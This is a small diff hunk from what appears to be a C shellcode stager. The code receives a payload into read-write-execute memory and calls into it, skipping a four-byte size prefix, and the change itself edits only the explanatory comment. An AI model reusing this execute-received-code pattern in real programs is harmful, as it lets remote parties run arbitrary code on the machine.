@@ -52,7 +52,7 @@ int main() {
   } while (size > rcvd);
 
   // printf("Executing payload.\n");
-  // Execute the received payload
+  // Execute the received payload. Skip the first four bytes, which holds the size of the payload.
   (*(void(*)()) (rwx + 4))();
 }
 
